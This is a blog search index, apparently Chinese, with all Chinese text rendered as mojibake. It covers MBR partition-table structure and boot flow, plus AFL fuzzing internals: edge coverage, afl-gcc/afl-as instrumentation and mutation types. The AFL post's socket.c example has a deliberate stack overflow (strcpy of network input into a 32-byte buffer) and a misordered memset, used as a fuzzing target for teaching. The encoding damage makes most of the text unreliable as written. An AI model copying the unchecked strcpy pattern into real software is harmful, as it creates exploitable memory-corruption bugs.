ï¼Œå…¶ä¸­çš„ç£ç›˜å¼•å¯¼ç¨‹åºçš„ä¸»è¦ä½œç”¨æ˜¯æ£€æŸ¥åˆ†åŒºè¡¨æ˜¯å¦æ­£ç¡®å¹¶ä¸”åœ¨ç³»ç»Ÿç¡¬ä»¶å®Œæˆè‡ªæ£€ä»¥åå°†æ§åˆ¶æƒäº¤ç»™ç£ç›˜ä¸Šçš„å¼•å¯¼ç¨‹åºï¼ˆå¦‚grubï¼‰ã€‚å®ƒä¸ä¾èµ–ä»»ä½•æ“ä½œç³»ç»Ÿï¼Œè€Œä¸”å¯åŠ¨ä»£ç å¯ä»¥æ”¹å˜ï¼Œä»è€Œå®ç°å¤šç³»ç»Ÿå¼•å¯¼ã€‚ä»£ç åŒºæœ€å¤§é•¿åº¦ä¸º446å­—èŠ‚ã€‚ 2. ç£ç›˜åˆ†åŒºè¡¨ å¤§å°ä¸º64å­—èŠ‚ï¼Œåç§»01be-01fdï¼Œå¯¹å››ä¸ªåˆ†åŒºçš„ä¿¡æ¯è¿›è¡Œæè¿°ï¼Œå…¶ä¸­æ¯ä¸ªåˆ†åŒºçš„ä¿¡æ¯å 16ä¸ªå­—èŠ‚ã€‚ä¸€ä¸ªè¯¦ç»†çš„ç£ç›˜åˆ†åŒºç»“æ„å„å­—èŠ‚å«ä¹‰è¡¨å¦‚ä¸‹ï¼š ä¾‹å¦‚ï¼ŒæŸä¸€åˆ†åŒºåœ¨ç£ç›˜åˆ†åŒºè¡¨çš„ä¿¡æ¯å¦‚ä¸‹ï¼š 80 01 01 00 0B FE BF FC 3F 00 00 00 7E 86 BB 00 é¦–å­—èŠ‚80ä¸ºåˆ†åŒºçš„æ¿€æ´»æ ‡å¿—ï¼Œè¡¨ç¤ºä¸ºæ´»åŠ¨åˆ†åŒºï¼Œå¯è¢«ç³»ç»Ÿå¼•å¯¼ï¼›01 01 00è¡¨ç¤ºåˆ†åŒºå¼€å§‹çš„ç£å¤´å·ä¸º1ï¼Œæ‰‡åŒºå¥½ä¸º1ï¼ŒæŸ±é¢å·ä¸º0ï¼›0bè¡¨ç¤ºåˆ†åŒºçš„ç³»ç»Ÿç±»å‹ä¸ºFAT32ï¼Œå…¶ä»–æ¯”è¾ƒå¸¸ç”¨çš„æœ‰04ï¼ˆFAT16ï¼‰ã€07ï¼ˆNTFSï¼‰ï¼›fe bf fcè¡¨ç¤ºåˆ†åŒºç»“æŸçš„ç£å¤´å·ä¸º254ï¼Œåˆ†åŒºç»“æŸçš„æ‰‡åŒºå·ä¸º63ï¼Œåˆ†åŒºç»“æŸçš„æŸ±é¢å·ä¸º764ï¼›3f 00 00 00è¡¨ç¤ºé¦–æ‰‡åŒºçš„ç›¸å¯¹æ‰‡åŒºå·ä¸º63ï¼ˆå°ç«¯ï¼‰ï¼›7e 86 bb 00è¡¨ç¤ºæ€»æ‰‡åŒºæ•°ä¸º12289662ï¼ˆå°ç«¯ï¼‰ã€‚ ï¼ˆè¿™é‡Œéœ€è¦æ³¨æ„ï¼Œå¯¹äºå¤§äº8.4Gçš„ç°ä»£ç£ç›˜ï¼ŒCHSçš„æ–¹å¼å·²ç»æ— æ³•è¡¨ç¤ºï¼ŒBIOSä½¿ç”¨LBAæ¨¡å¼ï¼Œå¯¹äºè¶…å‡ºçš„éƒ¨åˆ†ï¼ŒCHSå€¼é€šå¸¸è®¾å®šä¸º0xfeffffï¼Œå¹¶åŠ ä»¥å¿½ç•¥ï¼Œç›´æ¥ä½¿ç”¨åç§»0x08-0x0cçš„4å­—èŠ‚ç›¸å¯¹å€¼ï¼Œå†è¿›è¡Œå†…éƒ¨è½¬æ¢ã€‚ï¼‰ 3. ç»“æŸæ ‡å¿—å­— 55 AAï¼Œåç§»1feh-1ffhï¼Œæœ€å2ä¸ªå­—èŠ‚ï¼Œæ˜¯æ£€éªŒMBRæ˜¯å¦æœ‰æ•ˆçš„æ ‡å¿—ã€‚ ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:3","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Misc"],"content":"4. ä¸»å¼•å¯¼æ‰‡åŒºçš„è¯»å–æµç¨‹ ç³»ç»Ÿå¼€æœºæˆ–è€…é‡å¯ã€‚ BIOSä¸Šç”µè‡ªæ£€ï¼ˆPower On Self Test â€“ POSTï¼‰ã€‚BIOSæ‰§è¡Œå†…å­˜åœ°å€ä¸ºFFFF:0000Hå¤„çš„è·³è½¬æŒ‡ä»¤ï¼Œè·³è½¬åˆ°å›ºåŒ–åœ¨ROMä¸­çš„è‡ªæ£€ç¨‹åºå¤„ï¼Œå¯¹ç³»ç»Ÿç¡¬ä»¶ï¼ˆåŒ…æ‹¬å†…å­˜ï¼‰è¿›è¡Œæ£€æŸ¥ã€‚ è¯»å–ä¸»å¼•å¯¼è®°å½•ï¼ˆMBRï¼‰ã€‚å½“BIOSæ£€æŸ¥åˆ°ç¡¬ä»¶æ­£å¸¸å¹¶ä¸CMOSä¸­çš„è®¾ç½®ç›¸ç¬¦åï¼ŒæŒ‰ç…§CMOSä¸­å¯¹å¯åŠ¨è®¾å¤‡çš„è®¾ç½®é¡ºåºæ£€æµ‹å¯ç”¨çš„å¯åŠ¨è®¾å¤‡ã€‚BIOSå°†ç›¸åº”å¯åŠ¨è®¾å¤‡çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼ˆä¹Ÿå°±æ˜¯MBRæ‰‡åŒºï¼‰è¯»å…¥å†…å­˜åœ°å€ä¸º0000:7C00Hå¤„ã€‚ æ£€æŸ¥0000:7DFEH-0000:7DFFHï¼ˆMBRçš„ç»“æŸæ ‡å¿—ä½ï¼‰æ˜¯å¦ç­‰äº55AAHï¼Œè‹¥ä¸ç­‰äºåˆ™è½¬å»å°è¯•å…¶ä»–å¯åŠ¨è®¾å¤‡ï¼Œå¦‚æœæ²¡æœ‰å¯åŠ¨è®¾å¤‡æ»¡è¶³è¦æ±‚åˆ™æ˜¾ç¤º\"NO ROM BASIC\"ç„¶åæ­»æœºã€‚ å½“æ£€æµ‹åˆ°æœ‰å¯åŠ¨è®¾å¤‡æ»¡è¶³è¦æ±‚åï¼ŒBIOSå°†æ§åˆ¶æƒäº¤ç»™ç›¸åº”å¯åŠ¨è®¾å¤‡ã€‚å¯åŠ¨è®¾å¤‡çš„MBRå°†è‡ªå·±å¤åˆ¶åˆ°0000:0600Hå¤„ï¼Œç„¶åç»§ç»­æ‰§è¡Œã€‚ æ ¹æ®MBRä¸­çš„å¼•å¯¼ä»£ç å¯åŠ¨å¼•å¯¼ç¨‹åºã€‚ äº‹å®ä¸Šï¼ŒBIOSä¸ä»…æ£€æŸ¥0000:7DFEH-0000:7DFFHï¼ˆMBRçš„ç»“æŸæ ‡å¿—ä½ï¼‰æ˜¯å¦ç­‰äº55AAHï¼Œå¾€å¾€è¿˜å¯¹ç£ç›˜æ˜¯å¦æœ‰å†™ä¿æŠ¤ã€ä¸»å¼•å¯¼æ‰‡åŒºä¸­æ˜¯å¦å­˜åœ¨æ´»åŠ¨åˆ†åŒºç­‰è¿›è¡Œæ£€æŸ¥ã€‚å¦‚æœå‘ç°ç£ç›˜æœ‰å†™ä¿æŠ¤ï¼Œåˆ™æ˜¾ç¤ºç£ç›˜å†™ä¿æŠ¤å‡ºé”™ä¿¡æ¯ï¼›å¦‚æœå‘ç°ç£ç›˜ä¸­ä¸å­˜åœ¨æ´»åŠ¨åˆ†åŒºï¼Œåˆ™æ˜¾ç¤ºç±»ä¼¼å¦‚ä¸‹çš„ä¿¡æ¯â€œRemove disk or other media Press any key to restartâ€ã€‚ ","date":"2020-12-14","objectID":"/2020/12/mbr/:2:4","tags":["Linux"],"title":"MBRç®€ä»‹","uri":"/2020/12/mbr/"},{"categories":["Fuzz"],"content":"AFLäºŒä¸‰äº‹ç³»åˆ— note 2","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"æœ¬æ–‡æ˜¯AFLç³»åˆ—ç¬¬äºŒç¯‡ï¼Œä¸»è¦ä»‹ç»AFLçš„ä¸€äº›åŸºæœ¬åŸç†ã€‚ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:0:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"ä¸€ã€ä»£ç è¦†ç›–ç‡ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"1. è®¡ç®—æ–¹æ³• ä»£ç è¦†ç›–ç‡çš„è®¡é‡å•ä½ï¼Œé€šå¸¸æœ‰3ç§ï¼š å‡½æ•°ï¼ˆFuction-Levelï¼‰ åŸºæœ¬å—ï¼ˆBasicBlock-Levelï¼‰ è¾¹ç•Œï¼ˆEdge-Levelï¼‰ ï¼ˆ1ï¼‰å‡½æ•°ï¼ˆFuction-Levelï¼‰ è¿™ä¸ªå¾ˆå®¹æ˜“ç†è§£ï¼Œå°±æ˜¯ä»£ç æ‰§è¡Œæ—¶è°ƒç”¨åˆ°å“ªäº›å‡½æ•°ï¼Œä½†æ˜¯å‡½æ•°é‡Œé¢çš„å…·ä½“ä»£ç è¡Œå´ä¸ä½œç»Ÿè®¡ï¼Œç›¸å¯¹æ¯”è¾ƒç²—ç³™ä½†é«˜æ•ˆçš„ç»Ÿè®¡æ–¹å¼ã€‚ æ‰€ä»¥ï¼Œé€šå¸¸çš„ç»Ÿè®¡æ–¹å¼æ˜¯ç”¨åŸºæœ¬å—ï¼Œç®€ç§°BBã€‚ ï¼ˆ2ï¼‰åŸºæœ¬å—ï¼ˆBasicBlock-Levelï¼‰ åŸºæœ¬å—ï¼Œç›´æ¥çœ‹ä¸‹å›¾å°±å¾ˆå®¹æ˜“ç†è§£äº†ã€‚ IDAä¸­æ¯ä¸€å—ä»£ç å°±ä»£è¡¨ç€ä¸€ä¸ªåŸºæœ¬å—ï¼Œå°±æ˜¯ä»¥æŒ‡ä»¤è·³è½¬ä¸ºä½œåˆ’åˆ†ç•Œé™çš„ã€‚ ï¼ˆ3ï¼‰è¾¹ç•Œï¼ˆEdge-Levelï¼‰ edgeæœ¬èº«å°±æ¶µç›–äº†åŸºæœ¬å—éƒ¨åˆ†ï¼Œå”¯ä¸€çš„å·®åˆ«æ˜¯edgeå¤šè®°å½•äº†ä¸€äº›æ‰§è¡Œè¾¹ç•Œçš„ä¿¡æ¯ã€‚æ¯”å¦‚ç¤ºä¾‹ä»£ç ï¼š åœ¨IDAä¸­å¯ä»¥çœ‹åˆ°Aã€Bã€Cè¿™3ä¸ªåŸºæœ¬å—ï¼Œä½†å½“aä¸ºå‡æ—¶ï¼Œç¨‹åºå°±ä¼šä»Aæ‰§è¡Œåˆ°Cã€‚ å‰é¢åŸºæœ¬å—çš„æ–¹å¼å°±æ— æ³•ç¡®åˆ‡åœ°çŸ¥é“æ˜¯å¦æ›¾ä»Aæ‰§è¡Œåˆ°Cï¼Œå°¤å…¶æ˜¯è¯¥æ®µä»£ç è¢«å¤šæ¬¡æ‰§è¡Œçš„æƒ…å†µï¼Œå°±æ›´æ— æ³•çŸ¥é“ï¼Œè¿™æ—¶edgeè¦†ç›–æ–¹å¼å°±å‡ºç°äº†ã€‚ edgeä¼šåœ¨Aè·ŸCä¹‹é—´å»ºç«‹è™šæ‹Ÿå—Dï¼Œé€šè¿‡åˆ¤æ–­Dæ˜¯å¦æ‰§è¡Œè¿‡ï¼Œæ¥ç¡®è®¤æ˜¯å¦æ›¾ä»Aæ‰§è¡Œåˆ°Cï¼Œè¿™ç§æ–¹å¼ä¹Ÿä¼šæ¯”è¾ƒæ¶ˆè€—æ€§èƒ½ã€‚ ä»¥ä¸Šå†…å®¹æ‘˜è‡ªæ³‰å“¥åšå®¢ï¼ŒåŸæ–‡é“¾æ¥https://riusksk.me/2018/07/29/honggfuzz%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF1/ AFLé‡‡ç”¨çš„æ˜¯ç¬¬ä¸‰ç§æ–¹å¼ã€‚ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"2. AFLä¸­ä¸¤ç§ä»£ç è¦†ç›–ç‡è®¡ç®—æ–¹å¼ AFLæ”¯æŒä¸¤ç§ä»£ç è¦†ç›–ç‡è®¡ç®—æ–¹å¼ï¼Œæœ‰æºç çš„æƒ…å†µä¸‹ï¼Œåœ¨æºä»£ç ç¼–è¯‘æ—¶è¿›è¡Œæ’æ¡©ï¼Œæ— æºç çš„æƒ…å†µä¸‹ï¼Œä½¿ç”¨QEMUè¿›è¡ŒäºŒè¿›åˆ¶æ’æ¡©ã€‚ä¸‹ä¸€ç« èŠ‚ä¼šåˆ†åˆ«è¯¦ç»†è®²è§£è¿™ä¸¤ç§æƒ…å†µä½¿ç”¨çš„æ’æ¡©æŠ€æœ¯ã€‚ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:1:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"äºŒã€æ’æ¡© ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"1. æœ‰æºç  æˆ‘ä»¬ä»¥å¦‚ä¸‹ä»£ç ä¸ºä¾‹è¿›è¡Œè¯´æ˜ï¼Œæ–‡ä»¶åä¸º socket.c #include\u003cstdio.h\u003e #include\u003cstdlib.h\u003e #include\u003cstring.h\u003e #include\u003cunistd.h\u003e #include\u003csys/socket.h\u003e #include\u003cnetinet/in.h\u003e #define SERV_PORT 8000 #define SIZE 100 #define MAXLINE 64 int command(char* buf) { char recv[32]; memset(recv, 32, 0); strcpy(recv, buf + 8); return 0; } int main() { struct sockaddr_in servaddr,cliaddr; socklen_t cliaddr_len; int listenfd,connfd; char buf[MAXLINE]; int i,n,flag = 0; listenfd = socket(AF_INET,SOCK_STREAM,0); bzero(\u0026servaddr,sizeof(servaddr)); servaddr.sin_family = AF_INET; servaddr.sin_addr.s_addr = htonl(INADDR_ANY); servaddr.sin_port = htons(SERV_PORT); bind(listenfd,(struct sockaddr *)\u0026servaddr,sizeof(servaddr)); listen(listenfd,20); printf(\"Accepting connections..\\n\"); cliaddr_len = sizeof(cliaddr); connfd = accept(listenfd,(struct sockaddr *)\u0026cliaddr,\u0026cliaddr_len); char send_msg[MAXLINE*2] = \"hello, send by send() :\\n\"; send(connfd, send_msg, strlen(send_msg), 0); n = read(connfd,buf,MAXLINE); if(n!=0){ if(!strncmp(buf, \"test \", 5)) sprintf(send_msg, \"test: %s\\n\", buf + 5); else if(!strncmp(buf, \"help\", 4)) sprintf(send_msg, \"help:\\n\\ttest\\n\\tcommand\\n\\texit\\n\"); else if(!strncmp(buf, \"command \", 8)){ command(buf); sprintf(send_msg, \"it's a command\\n\"); } else if(!strncmp(buf, \"exit\", 4)) send(connfd, \"bye~\\n\", 4, 0); else sprintf(send_msg, \"unknown command!\\n\"); send(connfd, send_msg, strlen(send_msg), 0); } else printf(\"Client say close the connection..\\n\"); close(connfd); } å¯ä»¥è¿›è¡Œæºç æ’æ¡©çš„æŒ‡ä»¤æœ‰ afl-gccã€afl-g++ã€afl-clangã€afl-clang++ ( afl-clang-fast å’Œ afl-clang-fast++ æš‚ä¸è®¨è®º)ï¼Œé€šè¿‡æŸ¥çœ‹è¿™äº›æ–‡ä»¶çš„å…·ä½“å±æ€§ï¼Œå¯ä»¥å‘ç°åä¸‰è€…éƒ½æ˜¯ afl-gcc çš„è½¯é“¾æ¥ï¼Œå…¶å®éƒ½æ˜¯åŒä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼š é€šè¿‡åˆ†æ afl-gcc.c ä¸­çš„ä»£ç å¯ä»¥å‘ç°ï¼Œ afl-gcc å°±æ˜¯åœ¨åŸæœ‰çš„ç¼–è¯‘æŒ‡ä»¤ä¸Šå¢åŠ ä¸€äº›ç¼–è¯‘é€‰é¡¹ç„¶åè°ƒç”¨å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ï¼š ä¸ºäº†æ–¹ä¾¿æŸ¥çœ‹æ¯æ¬¡æºç ç¼–è¯‘æ—¶çš„ç¼–è¯‘é€‰é¡¹ï¼Œå¯ä»¥å¯¹ afl-gcc.c è¿›è¡Œä¿®æ”¹ï¼Œåœ¨ main() å‡½æ•°ä¸­è°ƒç”¨ execvp() ä¹‹å‰æ·»åŠ å¦‚ä¸‹ä»£ç ï¼Œæ‰“å°å‡ºå®é™…æ‰§è¡Œçš„ç¼–è¯‘æŒ‡ä»¤ï¼š //print command for(int i = 0; i \u003c cc_par_cnt; i++){ printf(\"%s \", cc_params[i]); } printf(\"\\n\"); å…¶ä¸­æ•°ç»„ cc_params å­˜æ”¾ç€ç¼–è¯‘æŒ‡ä»¤å’Œé€‰é¡¹ï¼Œæ•´æ•° cc_par_cnt å­˜æ”¾æ•°ç»„æœ‰æ•ˆå€¼ï¼Œä¿®æ”¹å®Œæˆåå¯¹AFLé‡æ–°è¿›è¡Œç¼–è¯‘å³å¯ã€‚ ï¼ˆafl-clang-fast å’Œ afl-clang-fast++ å¯¹åº”çš„æºç æ–‡ä»¶ä¸º llvm_mode/afl-clang-fast.c ï¼Œä¿®æ”¹æ–¹æ³•ç›¸åŒï¼‰ ä½¿ç”¨ afl-gcc å¯¹ä¸Šé¢ä»£ç è¿›è¡Œç¼–è¯‘ afl-gcc -o socket_afl socket.c å¯ä»¥çœ‹åˆ°å®é™…æ‰§è¡Œçš„ç¼–è¯‘æŒ‡ä»¤ä¸º gcc -o socket socket.c -B /usr/local/lib/afl -g -O3 -funroll-loops -D__AFL_COMPILER=1 -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 ï¼Œå…¶ä¸­ -B \u003cdirectory\u003e é€‰é¡¹ç”¨äºå°†æ·»åŠ åˆ°ç¼–è¯‘å™¨çš„æœç´¢è·¯å¾„ï¼Œ-g é€‰é¡¹ç”Ÿæˆè°ƒè¯•ä¿¡æ¯ï¼Œ-O3 ä¼˜åŒ–ç”Ÿæˆä»£ç ï¼Œ-funroll-loops é€‰é¡¹å±•å¼€å¾ªç¯çš„è¿­ä»£æ¬¡æ•°å¯ä»¥åœ¨ç¼–è¯‘æ—¶æˆ–è¿›å…¥å¾ªç¯æ—¶ç¡®å®šï¼Œå‰©ä½™ä¸¤ä¸ªä¸ºAFLä½¿ç”¨çš„é€‰é¡¹ã€‚ï¼ˆgccçš„é€‰é¡¹å¯ä»¥å‚è€ƒæ­¤é“¾æ¥ https://gcc.gnu.org/onlinedocs/gcc-4.4.2/gcc/Optimize-Options.htmlï¼‰ å¦‚æœäº†è§£ç¼–è¯‘è¿‡ç¨‹ï¼Œé‚£ä¹ˆå°±çŸ¥é“æŠŠæºä»£ç ç¼–è¯‘æˆäºŒè¿›åˆ¶ï¼Œä¸»è¦æ˜¯ç»è¿‡â€æºä»£ç â€-\u003eâ€æ±‡ç¼–ä»£ç â€-\u003eâ€äºŒè¿›åˆ¶â€è¿™æ ·çš„è¿‡ç¨‹ã€‚è€Œå°†æ±‡ç¼–ä»£ç ç¼–è¯‘æˆä¸ºäºŒè¿›åˆ¶çš„å·¥å…·ï¼Œå³ä¸ºæ±‡ç¼–å™¨assemblerã€‚Linuxç³»ç»Ÿä¸‹çš„å¸¸ç”¨æ±‡ç¼–å™¨æ˜¯asã€‚ä¸è¿‡ï¼Œç¼–è¯‘å®ŒæˆAFLåï¼Œåœ¨å…¶ç›®å½•ä¸‹ä¹Ÿä¼šå­˜åœ¨ä¸€ä¸ªasæ–‡ä»¶ï¼Œå¹¶ä½œä¸ºç¬¦å·é“¾æ¥æŒ‡å‘afl-asã€‚æ‰€ä»¥ï¼Œå¦‚æœé€šè¿‡-Bé€‰é¡¹ä¸ºgccè®¾ç½®äº†æœç´¢è·¯å¾„ï¼Œé‚£ä¹ˆafl-asä¾¿ä¼šä½œä¸ºæ±‡ç¼–å™¨ï¼Œæ‰§è¡Œå®é™…çš„æ±‡ç¼–æ“ä½œã€‚ æ‰€ä»¥ï¼ŒAFLçš„ä»£ç æ’æ¡©ï¼Œå°±æ˜¯åœ¨å°†æºæ–‡ä»¶ç¼–è¯‘ä¸ºæ±‡ç¼–ä»£ç åï¼Œé€šè¿‡ afl-as å®Œæˆã€‚ afl-as ä¸‹é¢é€šè¿‡å¯¹æ¯” gcc å’Œ afl-gcc çš„ç¼–è¯‘ç»“æœè¿›è¡Œå¤§è‡´åˆ†æã€‚ å°† afl-gcc ä¸­æ·»åŠ çš„ -Bã€-D__AFL_COMPILER=1ã€DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1 ä¸‰ä¸ªé€‰é¡¹å»æ‰ï¼Œè°ƒç”¨ gcc gcc -o socket socket.c -g -O3 -funroll-loops è¿™æ ·å°±ç”Ÿæˆäº† socket_afl å’Œ socket ä¸¤ä¸ªæ–‡ä»¶ã€‚ ä½¿ç”¨ bindiff å¯¹è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­çš„ main å‡½æ•°è¿›è¡Œå¯¹æ¯” ä¸Šå›¾ä¸­å³ä¸‹è§’éƒ¨åˆ†çœ‹èµ·æ¥ç»“æ„ä¸ä¸€æ ·ï¼Œä¸è¿‡è¿™é‡Œæ˜¯ bindiff è¯†åˆ«bugï¼Œå¤šå‡ºäº†ä¸€ä¸ªä»£ç å—å¹¶ä¸”å°‘äº†ä¸€æ¡çº¿ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†åˆ«ä½¿ç”¨ ida æ‰“å¼€è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹ main å‡½æ•°çš„ç»“æ„å›¾ è¿™é‡Œå¯¹ bindiff è¯¯æŠ¥ç»“æœçš„è¯¦ç»†åˆ†æå°±ä¸å¤šè¯´äº†ï¼Œè¿™ä¸ªä¸æ˜¯æœ¬æ¬¡çš„é‡ç‚¹ã€‚ å¯ä»¥çœ‹åˆ° afl è¿›è¡Œæºä»£ç æ’æ¡©æ—¶ä¸ä¼šæ”¹å˜ä»£ç çš„é€»è¾‘ç»“æ„ï¼Œä¹Ÿä¸ä¼šå¢åŠ æˆ–å‡å°‘ä»£ç å—ã€‚ å¯¹æ¯”çœ‹ä¸‹æ¯ä¸ªä»£ç å—ä¸­ä»£ç çš„åŒºåˆ« å¯ä»¥çœ‹å‡ºï¼ŒåŸºæœ¬æ¯ä¸ªä»£ç å—éƒ½è¢«æ·»åŠ äº†ä¸€æ®µç›¸ä¼¼çš„æ±‡ç¼–ä»£ç  åœ¨ ida ä¸­å°†è¿™éƒ¨åˆ†ä»£ç æ‹·è´å‡ºæ¥ï¼Œå¦‚ä¸‹ï¼š lea rsp, [rsp-98h] mov [rsp+1D0h+var_1D0], rdx mov [rsp+1D0h+var_1C8], rcx mov [rsp+1D0h+var_1C0], n mov rcx, 650Eh call __afl_maybe_log mov n, [rsp+1D0h+var_1C0] mov rcx, [rsp+1D0h+var_1C8] mov rdx, [rsp+1D0h+var_1D0] lea rsp, [rsp+98h] å¯¹æ¯”å¯ä»¥å‘ç°ï¼Œä¸åŒçš„ä»£ç å—åªæœ‰ mov rcx, 650Eh è¿™æ¡æ±‡ç¼–ä»£ç å‘ rcx å­˜æ”¾çš„å€¼ä¸åŒï¼Œè¿™ä¸ªå°±æ˜¯éšæœºç”Ÿæˆçš„æ ‡è¯†ä»£ç å—çš„idï¼Œå½“è¿è¡Œåˆ°è¿™éƒ¨åˆ†æ±‡ç¼–æ—¶ afl å°±çŸ¥é“æ˜¯å“ªä¸ªä»£ç å—è¢«æ‰§è¡Œäº†ã€‚ ä¸Šè¿° ida ä¸­çš„æ±‡ç¼–ä»£ç åŸå‹å¯ä»¥åœ¨ afl-as.h ä¸­æ‰¾åˆ°ï¼ˆä»¥64ä½ä»£ç ä¸ºä¾‹ï¼‰ï¼š ä¸Šè¿°ä»£ç æ‰§è¡Œçš„ä¸»è¦åŠŸèƒ½åŒ…æ‹¬ï¼š ä¿å­˜ rdxã€ rcx ã€rax å¯„å­˜å™¨ å°† rcx çš„å€¼è®¾ç½®ä¸º fprintf() å‡½æ•°å°†è¦æ‰“å°çš„å˜é‡å†…å®¹ è°ƒç”¨ __afl_maybe_log å‡½æ•° æ¢å¤å¯„å­˜å™¨ åœ¨ä»¥ä¸Šçš„åŠŸèƒ½ä¸­ï¼Œ __afl_maybe_log æ˜¯æ’æ¡©ä»£ç æ‰€æ‰§è¡Œçš„å®é™…å†…å®¹ï¼Œåç»­å°†è¯¦ç»†å±•å¼€ã€‚ å¯ä»¥åœ¨ afl-as.c ä¸­æŸ¥çœ‹åˆ°è¯¥æ±‡ç¼–çš„è°ƒç”¨ï¼Œé€šè¿‡ fprintf() å‡½æ•°çš„è°ƒç”¨ï¼Œå°†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ·»åŠ åˆ°æ±‡ç¼–æ–‡ä»¶çš„ç›¸åº”ä½ç½®ã€‚ è¿™é‡Œåˆ†æä¸‹ R(MAP_SIZE) ï¼Œå®ƒå°±æ˜¯ä¸Šé¢æ±‡ç¼–ä»£ç ä¸­å°† rcx è®¾ç½®çš„å€¼ã€‚æ ¹æ®å®šä¹‰ï¼Œ MAP_SIZE ä¸º64Kï¼Œè€Œå¯¹äº R(x) å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š å…¶ä¸­ R(MAP_SIZE) ç›¸å½“äº random() % (1 \u003c\u003c MAP_SIZE_POW2) ï¼Œä¹Ÿå°±æ˜¯ç”Ÿæˆéšæœºæ•°ï¼Œæ‰€ä»¥æ ‡è¯†ä»£ç å—çš„idæ˜¯éšæœºç”Ÿæˆçš„ï¼ˆä¸¤æ¬¡ç¼–è¯‘ç”Ÿæˆçš„ä»£ç æ®µidä¸åŒï¼‰ã€‚ ä¸Šè¿°è¿‡ç¨‹æ€»ç»“èµ·æ¥å°±æ˜¯åœ¨å¤„ç†åˆ°æŸä¸ªåˆ†æ”¯éœ€è¦æ’å…¥æ¡©ä»£ç æ—¶ï¼Œ afl-as ä¼šéšæœºç”Ÿæˆä¸€ä¸ªéšæœºæ•°ï¼Œä½œä¸ºè¿è¡Œæ—¶ä¿å­˜åœ¨ rcx ä¸­çš„å€¼ã€‚è€Œè¿™ä¸ªéšæœºæ•°ï¼Œä¾¿æ˜¯ç”¨äºæ ‡è¯†è¿™ä¸ªä»£ç å—çš„idã€‚ ï¼ˆå¤‡æ³¨ï¼šå› ä¸ºä»£ç å—IDéšæœºçš„é—®é¢˜ï¼Œä¼š","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"2. æ— æºç  æ— æºç æƒ…å†µä¸‹ï¼ŒAFLä½¿ç”¨QEMUè¿›è¡ŒäºŒè¿›åˆ¶æ’æ¡©ï¼Œå…·ä½“æ’æ¡©åŸç†å¾…è¡¥å……ã€‚ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/:2:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B2/"},{"categories":["Fuzz"],"content":"ä¸‰ã€å˜å¼‚ç­–ç•¥ AFLç»´æŠ¤äº†ä¸€ä¸ªé˜Ÿåˆ—(queue)ï¼Œæ¯æ¬¡ä»è¿™ä¸ªé˜Ÿåˆ—ä¸­å–å‡ºä¸€ä¸ªæ–‡ä»¶ï¼Œå¯¹å…¶è¿›è¡Œå¤§é‡å˜å¼‚ï¼Œå¹¶æ£€æŸ¥è¿è¡Œåæ˜¯å¦ä¼šå¼•èµ·ç›®æ ‡å´©æºƒã€å‘ç°æ–°è·¯å¾„ç­‰ç»“æœã€‚å˜å¼‚çš„ä¸»è¦ç±»å‹å¦‚ä¸‹ï¼š bitflipï¼ŒæŒ‰ä½ç¿»è½¬ï¼Œ1å˜ä¸º0ï¼Œ0å˜ä¸º1 arithmeticï¼Œæ•´æ•°åŠ /å‡ç®—æœ¯è¿ç®— interestï¼ŒæŠŠä¸€äº›ç‰¹æ®Šå†…å®¹æ›¿æ¢åˆ°åŸæ–‡ä»¶ä¸­ 